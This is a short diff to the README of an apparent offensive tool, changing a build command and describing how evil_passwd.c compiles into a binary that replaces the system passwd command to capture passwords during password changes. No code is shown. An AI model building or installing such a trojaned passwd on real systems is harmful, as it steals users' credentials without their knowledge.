@@ -40,7 +40,7 @@ This script will install the necessary system packages (such as `libcurl` and `c
 There is no compiled binary is provided in the repository. To compile your own use the following command:
 
 ```bash
-./compile_and_install.sh
+./compile.sh
 ```
 
 This script will compile the `evil_passwd.c` C file and output a binary named `evil_passwd` in the current directory. This binary is used to replace the original `passwd` command to capture passwords during password changes.
